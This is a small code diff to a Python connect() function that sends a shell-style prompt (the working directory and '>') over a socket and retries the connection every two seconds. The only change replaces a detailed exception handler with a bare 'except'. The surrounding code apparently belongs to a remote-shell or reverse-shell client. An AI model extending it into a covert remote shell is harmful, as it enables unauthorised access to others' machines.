@@ -21,8 +21,7 @@ def connect ():
             s.send((str(os.getcwd()) + ">").encode())
             print(str(os.getcwd()) + ">", end = "")
             break
-        except Exception as e:
-            print("Error: " + str(e))
+        except:
             print("Could not connect.")
             time.sleep(2)
 
